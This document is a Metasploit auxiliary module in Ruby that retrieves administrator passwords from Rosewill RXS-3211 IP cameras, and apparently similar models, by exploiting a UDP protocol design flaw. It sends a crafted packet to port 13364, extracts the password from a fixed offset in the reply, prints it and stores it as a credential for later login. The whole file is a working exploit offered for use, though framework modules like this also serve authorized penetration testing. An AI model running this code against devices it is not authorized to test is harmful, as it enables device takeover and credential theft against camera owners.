##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Rosewill RXS-3211 IP Camera Password Retriever',
      'Description' => %q{
          This module takes advantage of a protocol design issue with the Rosewill admin
        executable in order to retrieve passwords, allowing remote attackers to take
        administrative control over the device.  Other similar IP Cameras such as Edimax,
        Hawking, Zonet, etc, are also believed to have the same flaw, but not fully tested.
        The protocol design issue also allows attackers to reset passwords on the device.
      },
      'Author'      => 'Ben Schmidt',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(13364),
      ])
  end

  def run_host(ip)
    #Protocol
    target_mac = "\xff\xff\xff\xff\xff\xff"
    cmd  = "\x00"          #Request
    cmd << "\x06\xff\xf9"  #Type

    password = nil

    begin
      udp_sock = Rex::Socket::Udp.create( {
        'LocalHost' => datastore['CHOST'] || nil,
        'PeerHost'  => ip,
        'PeerPort'  => datastore['RPORT'],
        'Context'   =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
      })

      udp_sock.put(target_mac+cmd)

      res = udp_sock.recvfrom(65535, 0.5) and res[1]

      #Parse the reply if we get a response
      if res
        password = parse_reply(res)
      end
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
      print_error("Connection error")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      udp_sock.close if udp_sock
    end

    #Store the password if the parser returns something
    if password
      print_good("Password retrieved: #{password.to_s}")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'ipcam',
        user: '',
        password: password,
        proof: password
      )
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def parse_reply(pkt)
    @results ||= {}

    # Ignore "empty" packets
    return nil if not pkt[1]

    if(pkt[1] =~ /^::ffff:/)
      pkt[1] = pkt[1].sub(/^::ffff:/, '')
    end

    return pkt[0][333,12] if pkt[0][6,4] == "\x01\x06\xff\xf9"
  end
end
